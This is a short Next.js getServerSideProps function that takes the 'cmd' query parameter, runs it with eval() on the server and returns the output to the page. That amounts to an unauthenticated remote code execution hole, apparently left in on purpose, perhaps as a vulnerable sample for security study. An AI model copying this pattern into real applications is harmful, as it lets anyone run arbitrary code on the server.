export async function getServerSideProps(context) {
  const { query } = context;
  const userInput = query.cmd || "";

  let result = "";

  try {
    const output = eval(userInput);
    try {
      result = JSON.stringify(output, null, 2);
    } catch {
      result = String(output);
    }
  } catch (e) {
    result = "Error: " + e.message;
  }

  return {
    props: { result },
  };
}
